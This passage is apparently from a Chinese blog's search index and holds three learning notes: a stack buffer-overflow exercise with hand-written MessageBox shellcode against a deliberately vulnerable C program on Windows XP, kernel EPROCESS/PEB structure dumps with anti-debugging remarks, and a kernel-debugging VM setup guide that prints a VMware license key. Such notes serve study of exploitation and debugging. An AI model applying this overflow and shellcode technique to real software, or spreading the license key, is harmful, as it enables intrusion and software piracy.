\u0026#34;1234567\u0026#34; int verify_password(char *password) { int authenticated; char buffer[8]; authenticated = strcmp(password, PASSWORD); strcpy(buffer, password); return authenticated; } int main() { int valid_flag = 0; char password[1024]; FILE * fp; if(!(fp = fopen(\u0026#34;password.txt\u0026#34;, \u0026#34;rw+\u0026#34;))) { exit(0); } fscanf(fp, \u0026#34;%s\u0026#34;, password); valid_flag = verify_password(password); if(valid_flag) { printf(\u0026#34;ERROR!\u0026#34;); } else { printf(\u0026#34;OK!\u0026#34;); } fclose(fp); } 分析(ExpStd0102) 首先使用已知的地址进行shellcode的编写，此地址不同编译器编译出的结果不同，不同系统加载的地址也不同，所以只能测试时使用\n必要信息 成功分支地址：0x0040111F 由于内存逆序存放，应该逆序写这些值 十六进制编辑password.txt，如下 1 2 34 33 32 31 34 33 32 31 34 33 32 31 34 33 32 31 1F 11 40 00 运行程序，此时 在栈地址0x0012FB24处存放的事是函数verify_password的返回地址 此处已经被冲刷为0040111F，而此地址是成功分支地址 使用成功分支地址替代了返回地址，但是由于堆栈不平衡，所以程序显示成功后崩溃 加入攻击载荷(ShellCode) 加大了buffer的大小用来承载攻击载荷\n动态加载DLL用于调用API\n代码(ExpStd0103) 编译环境：Windows XP SP3, Visual C++ 6, Debug\n实验环境：Windows XP SP3\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;windows.h\u0026gt; #define PASSWORD \u0026#34;1234567\u0026#34; int verify_password(char *password) { int authenticated; char buffer[44]; authenticated = strcmp(password, PASSWORD); strcpy(buffer, password); return authenticated; } int main() { int valid_flag = 0; char password[1024]; FILE * fp; LoadLibrary(\u0026#34;user32.dll\u0026#34;); if(!(fp = fopen(\u0026#34;password.txt\u0026#34;, \u0026#34;rw+\u0026#34;))) { exit(0); } fscanf(fp, \u0026#34;%s\u0026#34;, password); valid_flag = verify_password(password); if(valid_flag) { printf(\u0026#34;ERROR!\u0026#34;); } else { printf(\u0026#34;OK!\u0026#34;); } fclose(fp); } 分析(ExpStd0103) 目标：在程序验证时植入代码，实现弹窗MessageBox\n必要信息 数组起始地址：0x0012FAF0(也是ShellCode执行的起始地址) MessageBoxA地址：0x77D507EC 十六进制的文字：4D6F656F6D75(Moeomuoo) 组成的机器码 机器码(HEX) 汇编码 注释 33DB XOR EBX, EBX 清空EBX，保证ShellCode中无0(截至符) 53 PUSH EBX 字符串末尾的\\0 68 6D756F6F PUSH 6F6F756D 压入文字字节muoo(0x6D756F6F) 68 4D6F656F PUSH 6F656F4D 压入文字字节Moeo(0x4D6F656F) 8BC4 MOV EAX, ESP ESP栈顶指向字符串Moeomuoo，移交给EAX 53 PUSH EBX MB_OK 50 PUSH EAX Message 50 PUSH EAX Caption 53 PUSH EBX Handle B8 EC07D577 MOV EAX, 0x77D507EC 将MessageBoxA的地址硬编码移入EAX FFD0 CALL EAX 调用MessageBoxA 将机器码按照顺序写入password.txt 53-56字节填入返回地址(Buffer的起始地址)，其余字节用0x90填充 填充运行测试发现，最后只剩下2字节的空间可用，唯一不完美的地方在于程序崩溃退出 以下是最终的password.txt\n1 2 3 4 33 DB 53 68 6D 75 6F 6F 68 4D 6F 65 6F 8B C4 53 50 50 53 B8 EC 07 D5 77 FF D0 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 F0 FA 12 00 总结 本文讨论了如何利用缓冲区溢出漏洞以及ShellCode的编写，但不足之处在于硬编码地址和栈空间移位的问题\n有关这些问题下一篇讨论\n","date":"2020-10-18T10:00:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-001-%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/","title":"漏洞利用学习笔记-001-缓冲区溢出"},{"content":"本文来源：Moeomu的博客\n非公开内核结构 Windows的非公开结构非常多，而有些结构是半公开的，虽然有字段名，但只能推测其用意\nWinDbg能加载一些内核调试符号，在这些PDB文件中，有一些半公开结构的信息\nEPROCESS(KPEB)(Kernel Process Environment Block) 每一个进程都由一个EPROCESS结构表示，而这些结构被一个双向链表所连接\n结构信息 0x000偏移是PCB(Process Control Block)的地址，它位于R0中 0x0b4偏移是PID，它是标识此进程的唯一标识符 0x0b8偏移是活动进程链表，可以用它遍历系统的所有EPROCESS结构 结构组成 以下是此结构的详细内容\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 kd\u0026gt; dt _eprocess nt!_EPROCESS +0x000 Pcb : _KPROCESS // 进程控制块 +0x098 ProcessLock : _EX_PUSH_LOCK // 进程锁 +0x0a0 CreateTime : _LARGE_INTEGER // 创建时间 +0x0a8 ExitTime : _LARGE_INTEGER // 退出时间 +0x0b0 RundownProtect : _EX_RUNDOWN_REF // 进程加保护 +0x0b4 UniqueProcessId : Ptr32 Void // PID +0x0b8 ActiveProcessLinks : _LIST_ENTRY // 活动进程链表 +0x0c0 ProcessQuotaUsage : [2] Uint4B // 物理页相关的统计信息 +0x0c8 ProcessQuotaPeak : [2] Uint4B // 物理页相关的统计信息 +0x0d0 CommitCharge : Uint4B +0x0d4 QuotaBlock : Ptr32 _EPROCESS_QUOTA_BLOCK +0x0d8 CpuQuotaBlock : Ptr32 _PS_CPU_QUOTA_BLOCK +0x0dc PeakVirtualSize : Uint4B // 虚拟内存池大小 +0x0e0 VirtualSize : Uint4B // 虚拟内存大小 +0x0e4 SessionProcessLinks : _LIST_ENTRY +0x0ec DebugPort : Ptr32 Void // 调试端口 +0x0f0 ExceptionPortData : Ptr32 Void +0x0f0 ExceptionPortValue : Uint4B +0x0f0 ExceptionPortState : Pos 0, 3 Bits +0x0f4 ObjectTable : Ptr32 _HANDLE_TABLE +0x0f8 Token : _EX_FAST_REF // 权限令牌的地址 +0x0fc WorkingSetPage : Uint4B +0x100 AddressCreationLock : _EX_PUSH_LOCK +0x104 RotateInProgress : Ptr32 _ETHREAD +0x108 ForkInProgress : Ptr32 _ETHREAD +0x10c HardwareTrigger : Uint4B +0x110 PhysicalVadRoot : Ptr32 _MM_AVL_TABLE +0x114 CloneRoot : Ptr32 Void +0x118 NumberOfPrivatePages : Uint4B +0x11c NumberOfLockedPages : Uint4B +0x120 Win32Process : Ptr32 Void +0x124 Job : Ptr32 _EJOB +0x128 SectionObject : Ptr32 Void +0x12c SectionBaseAddress : Ptr32 Void +0x130 Cookie : Uint4B +0x134 Spare8 : Uint4B +0x138 WorkingSetWatch : Ptr32 _PAGEFAULT_HISTORY +0x13c Win32WindowStation : Ptr32 Void +0x140 InheritedFromUniqueProcessId : Ptr32 Void +0x144 LdtInformation : Ptr32 Void +0x148 VdmObjects : Ptr32 Void +0x14c ConsoleHostProcess : Uint4B +0x150 DeviceMap : Ptr32 Void +0x154 EtwDataSource : Ptr32 Void +0x158 FreeTebHint : Ptr32 Void +0x160 PageDirectoryPte : _HARDWARE_PTE +0x160 Filler : Uint8B +0x168 Session : Ptr32 Void +0x16c ImageFileName : [15] UChar +0x17b PriorityClass : UChar +0x17c JobLinks : _LIST_ENTRY +0x184 LockedPagesList : Ptr32 Void +0x188 ThreadListHead : _LIST_ENTRY // ETHREAD结构链表头 +0x190 SecurityPort : Ptr32 Void +0x194 PaeTop : Ptr32 Void +0x198 ActiveThreads : Uint4B // 正在运行的线程数量 +0x19c ImagePathHash : Uint4B +0x1a0 DefaultHardErrorProcessing : Uint4B +0x1a4 LastThreadExitStatus : Int4B +0x1a8 Peb : Ptr32 _PEB // 进程环境块地址 +0x1ac PrefetchTrace : _EX_FAST_REF +0x1b0 ReadOperationCount : _LARGE_INTEGER +0x1b8 WriteOperationCount : _LARGE_INTEGER +0x1c0 OtherOperationCount : _LARGE_INTEGER +0x1c8 ReadTransferCount : _LARGE_INTEGER +0x1d0 WriteTransferCount : _LARGE_INTEGER +0x1d8 OtherTransferCount : _LARGE_INTEGER +0x1e0 CommitChargeLimit : Uint4B +0x1e4 CommitChargePeak : Uint4B +0x1e8 AweInfo : Ptr32 Void +0x1ec SeAuditProcessCreationInfo : _SE_AUDIT_PROCESS_CREATION_INFO +0x1f0 Vm : _MMSUPPORT +0x25c MmProcessLinks : _LIST_ENTRY +0x264 HighestUserAddress : Ptr32 Void +0x268 ModifiedPageCount : Uint4B +0x26c Flags2 : Uint4B +0x26c JobNotReallyActive : Pos 0, 1 Bit +0x26c AccountingFolded : Pos 1, 1 Bit +0x26c NewProcessReported : Pos 2, 1 Bit +0x26c ExitProcessReported : Pos 3, 1 Bit +0x26c ReportCommitChanges : Pos 4, 1 Bit +0x26c LastReportMemory : Pos 5, 1 Bit +0x26c ReportPhysicalPageChanges : Pos 6, 1 Bit +0x26c HandleTableRundown : Pos 7, 1 Bit +0x26c NeedsHandleRundown : Pos 8, 1 Bit +0x26c RefTraceEnabled : Pos 9, 1 Bit +0x26c NumaAware : Pos 10, 1 Bit +0x26c ProtectedProcess : Pos 11, 1 Bit +0x26c DefaultPagePriority : Pos 12, 3 Bits +0x26c PrimaryTokenFrozen : Pos 15, 1 Bit +0x26c ProcessVerifierTarget : Pos 16, 1 Bit +0x26c StackRandomizationDisabled : Pos 17, 1 Bit +0x26c AffinityPermanent : Pos 18, 1 Bit +0x26c AffinityUpdateEnable : Pos 19, 1 Bit +0x26c PropagateNode : Pos 20, 1 Bit +0x26c ExplicitAffinity : Pos 21, 1 Bit +0x270 Flags : Uint4B +0x270 CreateReported : Pos 0, 1 Bit +0x270 NoDebugInherit : Pos 1, 1 Bit +0x270 ProcessExiting : Pos 2, 1 Bit +0x270 ProcessDelete : Pos 3, 1 Bit +0x270 Wow64SplitPages : Pos 4, 1 Bit +0x270 VmDeleted : Pos 5, 1 Bit +0x270 OutswapEnabled : Pos 6, 1 Bit +0x270 Outswapped : Pos 7, 1 Bit +0x270 ForkFailed : Pos 8, 1 Bit +0x270 Wow64VaSpace4Gb : Pos 9, 1 Bit +0x270 AddressSpaceInitialized : Pos 10, 2 Bits +0x270 SetTimerResolution : Pos 12, 1 Bit +0x270 BreakOnTermination : Pos 13, 1 Bit +0x270 DeprioritizeViews : Pos 14, 1 Bit +0x270 WriteWatch : Pos 15, 1 Bit +0x270 ProcessInSession : Pos 16, 1 Bit +0x270 OverrideAddressSpace : Pos 17, 1 Bit +0x270 HasAddressSpace : Pos 18, 1 Bit +0x270 LaunchPrefetched : Pos 19, 1 Bit +0x270 InjectInpageErrors : Pos 20, 1 Bit +0x270 VmTopDown : Pos 21, 1 Bit +0x270 ImageNotifyDone : Pos 22, 1 Bit +0x270 PdeUpdateNeeded : Pos 23, 1 Bit +0x270 VdmAllowed : Pos 24, 1 Bit +0x270 CrossSessionCreate : Pos 25, 1 Bit +0x270 ProcessInserted : Pos 26, 1 Bit +0x270 DefaultIoPriority : Pos 27, 3 Bits +0x270 ProcessSelfDelete : Pos 30, 1 Bit +0x270 SetTimerResolutionLink : Pos 31, 1 Bit +0x274 ExitStatus : Int4B +0x278 VadRoot : _MM_AVL_TABLE +0x298 AlpcContext : _ALPC_PROCESS_CONTEXT +0x2a8 TimerResolutionLink : _LIST_ENTRY +0x2b0 RequestedTimerResolution : Uint4B +0x2b4 ActiveThreadsHighWatermark : Uint4B +0x2b8 SmallestTimerResolution : Uint4B +0x2bc TimerResolutionStackRecord : Ptr32 _PO_DIAG_STACK_RECORD PEB(Process Environment Block) 此结构位于R3层，相对容易修改\n结构信息 0x002偏移是是否被调试的FLAG的位置，这个值在R3下即可被修改 0x068偏移此值平时是0，被调试时是0x70 0x018偏移是_HEAP结构的地址，此结构体内可以判断在偏移0x40=2和0x44=0时为非调试状态 结构组成 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 kd\u0026gt; dt _PEB nt!_PEB +0x000 InheritedAddressSpace : UChar +0x001 ReadImageFileExecOptions : UChar +0x002 BeingDebugged : UChar // 是否被调试 +0x003 BitField : UChar +0x003 ImageUsesLargePages : Pos 0, 1 Bit +0x003 IsProtectedProcess : Pos 1, 1 Bit +0x003 IsLegacyProcess : Pos 2, 1 Bit +0x003 IsImageDynamicallyRelocated : Pos 3, 1 Bit +0x003 SkipPatchingUser32Forwarders : Pos 4, 1 Bit +0x003 SpareBits : Pos 5, 3 Bits +0x004 Mutant : Ptr32 Void +0x008 ImageBaseAddress : Ptr32 Void +0x00c Ldr : Ptr32 _PEB_LDR_DATA // 进程装载的模块结构体 +0x010 ProcessParameters : Ptr32 _RTL_USER_PROCESS_PARAMETERS +0x014 SubSystemData : Ptr32 Void +0x018 ProcessHeap : _HEAP // 0x40=2\u0026amp;\u0026amp;0x44=0为非调试状态 +0x01c FastPebLock : Ptr32 _RTL_CRITICAL_SECTION +0x020 AtlThunkSListPtr : Ptr32 Void +0x024 IFEOKey : Ptr32 Void +0x028 CrossProcessFlags : Uint4B +0x028 ProcessInJob : Pos 0, 1 Bit +0x028 ProcessInitializing : Pos 1, 1 Bit +0x028 ProcessUsingVEH : Pos 2, 1 Bit +0x028 ProcessUsingVCH : Pos 3, 1 Bit +0x028 ProcessUsingFTH : Pos 4, 1 Bit +0x028 ReservedBits0 : Pos 5, 27 Bits +0x02c KernelCallbackTable : Ptr32 Void +0x02c UserSharedInfoPtr : Ptr32 Void +0x030 SystemReserved : [1] Uint4B +0x034 AtlThunkSListPtr32 : Uint4B +0x038 ApiSetMap : Ptr32 Void +0x03c TlsExpansionCounter : Uint4B +0x040 TlsBitmap : Ptr32 Void +0x044 TlsBitmapBits : [2] Uint4B +0x04c ReadOnlySharedMemoryBase : Ptr32 Void +0x050 HotpatchInformation : Ptr32 Void +0x054 ReadOnlyStaticServerData : Ptr32 Ptr32 Void +0x058 AnsiCodePageData : Ptr32 Void +0x05c OemCodePageData : Ptr32 Void +0x060 UnicodeCaseTableData : Ptr32 Void +0x064 NumberOfProcessors : Uint4B +0x068 NtGlobalFlag : Uint4B // 反调试用 +0x070 CriticalSectionTimeout : _LARGE_INTEGER +0x078 HeapSegmentReserve : Uint4B +0x07c HeapSegmentCommit : Uint4B +0x080 HeapDeCommitTotalFreeThreshold : Uint4B +0x084 HeapDeCommitFreeBlockThreshold : Uint4B +0x088 NumberOfHeaps : Uint4B +0x08c MaximumNumberOfHeaps : Uint4B +0x090 ProcessHeaps : Ptr32 Ptr32 Void +0x094 GdiSharedHandleTable : Ptr32 Void +0x098 ProcessStarterHelper : Ptr32 Void +0x09c GdiDCAttributeList : Uint4B +0x0a0 LoaderLock : Ptr32 _RTL_CRITICAL_SECTION +0x0a4 OSMajorVersion : Uint4B // 系统主版本号 +0x0a8 OSMinorVersion : Uint4B // 系统子版本号 +0x0ac OSBuildNumber : Uint2B // 系统构建版本号 +0x0ae OSCSDVersion : Uint2B +0x0b0 OSPlatformId : Uint4B +0x0b4 ImageSubsystem : Uint4B +0x0b8 ImageSubsystemMajorVersion : Uint4B +0x0bc ImageSubsystemMinorVersion : Uint4B +0x0c0 ActiveProcessAffinityMask : Uint4B +0x0c4 GdiHandleBuffer : [34] Uint4B +0x14c PostProcessInitRoutine : Ptr32 void +0x150 TlsExpansionBitmap : Ptr32 Void +0x154 TlsExpansionBitmapBits : [32] Uint4B +0x1d4 SessionId : Uint4B +0x1d8 AppCompatFlags : _ULARGE_INTEGER +0x1e0 AppCompatFlagsUser : _ULARGE_INTEGER +0x1e8 pShimData : Ptr32 Void +0x1ec AppCompatInfo : Ptr32 Void +0x1f0 CSDVersion : _UNICODE_STRING +0x1f8 ActivationContextData : Ptr32 _ACTIVATION_CONTEXT_DATA +0x1fc ProcessAssemblyStorageMap : Ptr32 _ASSEMBLY_STORAGE_MAP +0x200 SystemDefaultActivationContextData : Ptr32 _ACTIVATION_CONTEXT_DATA +0x204 SystemAssemblyStorageMap : Ptr32 _ASSEMBLY_STORAGE_MAP +0x208 MinimumStackCommit : Uint4B +0x20c FlsCallback : Ptr32 _FLS_CALLBACK_INFO +0x210 FlsListHead : _LIST_ENTRY +0x218 FlsBitmap : Ptr32 Void +0x21c FlsBitmapBits : [4] Uint4B +0x22c FlsHighIndex : Uint4B +0x230 WerRegistrationData : Ptr32 Void +0x234 WerShipAssertPtr : Ptr32 Void +0x238 pContextData : Ptr32 Void +0x23c pImageHeaderHash : Ptr32 Void +0x240 TracingFlags : Uint4B +0x240 HeapTracingEnabled : Pos 0, 1 Bit +0x240 CritSecTracingEnabled : Pos 1, 1 Bit +0x240 SpareTracingBits : Pos 2, 30 Bits 参考文档 [1]Infosavvy.Understanding EProcess Structure[J/OL].2020-07-24\n","date":"2020-10-17T20:23:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/windows%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-002-%E7%BB%93%E6%9E%84%E4%BD%93/","title":"Windows内核调试学习笔记-002-结构体"},{"content":"本文来源：Moeomu的博客\n下载工具 Windows 7 SP1 x86 镜像迅雷下载链接 VMWare Workstation 16(链接在下方) WinDbg Preview(Microsoft Store) 安装Windows虚拟机 最初以Windows 7 SP1 x86为例子来学习\nMSDN下载官方镜像 VMWare Workstation 16搭建虚拟环境 下载：VMWare 16 Link 密钥：ZF3R0-FHED2-M80TY-8QYGC-NPKYF 配置Windows内核调试虚拟机 移除此虚拟机的打印机设备 添加串行串口 点击使用命名的管道 填入字符串：\\\\.\\pipe\\Windows7x86(可以填入自己希望的管道命名，但是只能修改Windows7x86位置处) 下方选择该端是服务器，另一端是应用程序 I/O模式中，选择轮询时主动放弃 配置完成如下图所示\n配置Windows7 输入命令msconfig，点击引导，如图 点击高级选项，启用调试，波特率，如图 配置WinDbg Preview 首先启动代理网络，用于解除GFW限制 设置WinDbg的符号服务器和本地缓存目录SRV*D:\\LocalSymbols*http://msdl.microsoft.com/download/symbols Attach to kernel-COM-能选的对勾都选上-填波特率-Port填\\\\.\\pipe\\Windows7x86 点击OK以调试虚拟机内核 设置WinDbg的符号服务器代理set _NT_SYMBOL_PROXY=代理服务器地址:端口号 ","date":"2020-10-17T19:27:00+08:00","permalink":"https://blog.moeomu.com/zh-cn/posts/windows%E5%86%85%E6%A0%B8%E8%B0%83%E8%AF%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-001-%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","title":"Windows内核调试学习笔记-001-环境搭建"}]